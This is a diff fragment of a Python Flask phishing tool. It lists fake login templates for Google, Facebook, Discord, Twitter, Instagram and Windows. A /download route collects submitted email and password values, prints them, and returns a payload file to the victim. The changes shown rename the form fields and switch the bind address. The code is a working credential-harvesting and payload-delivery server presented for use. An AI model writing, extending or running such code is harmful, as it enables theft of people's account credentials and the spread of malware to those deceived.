@@ -17,12 +17,14 @@ tag_ok = "["+Style.BRIGHT+Fore.GREEN +"+"+Style.RESET_ALL+"]"
 tag_notok = "["+Style.BRIGHT+Fore.RED +"-"+Style.RESET_ALL+"]"
 tag_hm = "["+Style.BRIGHT+Fore.LIGHTCYAN_EX +"^"+Style.RESET_ALL+"]"
 
-templates = ["google",
+templates = [
+            "google",
              "facebook",
              "discordapp",
              "twitter",
              "instagram",
-             "windows"]
+             "windows"
+            ]
 
 def checkTemplate(template_name):
     if(template_name in templates):
@@ -85,12 +87,12 @@ def WebServer(mode, payload):
     @app.route("/download", methods=["POST"])
     def download():
         if(request.method == "POST"):
-            winEmail = request.form.get('microsoftemail')
-            winPass = request.form.get('microsoftpassword')
+            winEmail = request.form.get('email')
+            winPass = request.form.get('password')
             print(tag_ok + " POST : {e}".format(e=winEmail))
             print(tag_ok + " POST : {p}".format(p=winPass))
             return send_file(payload, as_attachment=True)
         
 
 
-    app.run(host="0.0.0.0", port=80)
+    app.run(host="127.0.0.1", port=80)
